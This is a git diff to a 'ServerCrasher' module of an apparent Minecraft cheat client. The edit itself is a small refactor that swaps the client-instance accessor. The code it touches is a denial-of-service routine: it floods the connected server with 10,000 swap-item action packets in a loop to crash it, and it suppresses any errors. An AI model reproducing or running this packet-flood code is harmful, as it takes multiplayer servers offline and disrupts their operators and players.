@@ -1,5 +1,6 @@
 package me.constantindev.ccl.module;
 
+import me.constantindev.ccl.Cornos;
 import me.constantindev.ccl.etc.MType;
 import me.constantindev.ccl.etc.ServerCrasherManager;
 import me.constantindev.ccl.etc.base.Module;
@@ -9,7 +10,6 @@ import me.constantindev.ccl.etc.event.EventHelper;
 import me.constantindev.ccl.etc.event.EventType;
 import me.constantindev.ccl.etc.event.arg.PacketEvent;
 import me.constantindev.ccl.etc.helper.ClientHelper;
-import net.minecraft.client.MinecraftClient;
 import net.minecraft.network.packet.c2s.play.KeepAliveC2SPacket;
 import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
 import net.minecraft.util.math.BlockPos;
@@ -38,14 +38,14 @@ public class ServerCrasher extends Module {
         ServerCrasherManager.mode = this.mconf.getByName("mode").value;
         ServerCrasherManager.strength = strength;
         if (ServerCrasherManager.mode.equalsIgnoreCase("swing")) {
-            if (MinecraftClient.getInstance().getNetworkHandler() == null) {
+            if (Cornos.minecraft.getNetworkHandler() == null) {
                 this.isOn.setState(false);
                 return;
             }
             try {
                 for (int i = 0; i < 10000; i++) {
                     PlayerActionC2SPacket p = new net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, BlockPos.ORIGIN, Direction.DOWN);
-                    MinecraftClient.getInstance().getNetworkHandler().sendPacket(p);
+                    Cornos.minecraft.getNetworkHandler().sendPacket(p);
                 }
 
             } catch (Exception ignored) {
